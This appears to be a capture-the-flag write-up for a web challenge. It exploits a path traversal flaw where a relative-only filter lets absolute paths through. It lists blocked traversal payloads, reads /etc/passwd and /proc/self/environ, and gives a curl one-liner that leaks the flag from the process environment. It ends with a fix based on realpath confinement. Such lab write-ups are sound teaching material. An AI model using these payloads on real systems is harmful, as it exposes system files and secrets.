# Touchline Dispatch

- **Category:** web
- **Points:** 300
- **Branch:** `chal/web-touchline-dispatch`
- **Target:** `http://54.72.82.22:8300`
- **Status:** ✅ SOLVED

## Flag

```
safctf{276928973c4dea42f63d808ba7be66b7}
```

Leaked from the service's own environment: `GET /api/view?name=/proc/self/environ`.

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16   (debug OFF - 500s are plain 265-byte pages)
```

Themed page: **"Touchline Dispatch"** soccer clubhouse. Two documented services
(under a "Desk services" disclosure):

```
GET /api/library                lists documents
GET /api/view?name=...          opens a document
```

There is a "Desk console" widget that lets the browser send GET/POST/PATCH with
arbitrary headers to a local path — a red herring, since it is a same-origin
`fetch()` from the page and adds no new server surface.

## The bug: relative-only traversal filter

`name` is used directly as a filesystem path. The filter catches the *relative*
escape spellings with a 400:

```
..%2fflag.txt          -> 400 {"message":"Request unavailable."}
....//....//flag.txt   -> 400
..;/flag.txt           -> 400
foo.txt                -> 400   (allowlist / existence check)
```

but **absolute paths sail through**:

```
/etc/passwd             -> 200 {"text":"root:x:0:0:root:/root:/bin/bash\ndaemon:..."}
/proc/self/environ      -> 200 ...
/proc/self/cmdline      -> 200 {"text":"python\u0000service.py\u0000"}
```

The 400 on `/flag` and `/app/flag.txt` just means those files do not exist — the
check is "did the read succeed", not "is this path allowed".

The odd 500s (`name=schedule.txt/../../flag.txt`) are the app feeding a bad
path — e.g. a path that resolves to a directory or a component that is not a
directory — into `open()`. Debug is off, so they leak nothing.

## Exploitation

`/proc/self/environ` hands over the process environment. The flag is injected
there rather than stored in a file:

```
FLAG=safctf{276928973c4dea42f63d808ba7be66b7}
```

`/proc/1/environ` returns the same value. `/proc/self/cmdline` shows the service
is `python service.py`, so `/proc/self/cwd` + the app source were available too —
the env var was simply the shortest path.

## Exploit

```bash
curl -s 'http://54.72.82.22:8300/api/view?name=/proc/self/environ'
```

See `solve.py`.

## Lesson

Filtering `..` is not path confinement. Absolute paths, `/proc` pseudo-files, and
`/etc` all remain reachable. The correct control is resolving the real path and
confirming it is inside a fixed base directory (`os.path.realpath` +
`startswith`), or serving from an explicit allowlist of resolved names.
